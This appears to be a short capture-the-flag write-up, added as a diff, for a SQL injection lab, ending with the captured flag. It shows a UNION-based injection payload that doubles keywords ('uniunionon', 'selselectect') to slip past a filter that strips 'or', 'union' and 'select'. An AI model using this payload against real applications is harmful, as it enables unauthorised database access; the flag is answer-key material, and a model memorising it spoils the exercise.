@@ -1,0 +1,5 @@
+After ordering by we find out that there are a total of 14 columns and from hit and trial we know that out of 14, the second one is vulnerable.
+Input in search for SQLi: pramod' oorr '1' = '1' uniunionon selselectect 1,database(),3,4,5,6,7,8,9,10,11,12,13,14 #
+Once or,union,select are removed new letters also form the same words and thus the query works.
+
+FLAG: cs628a{d5e32e42eb713344a234d6eab5dedec8c}
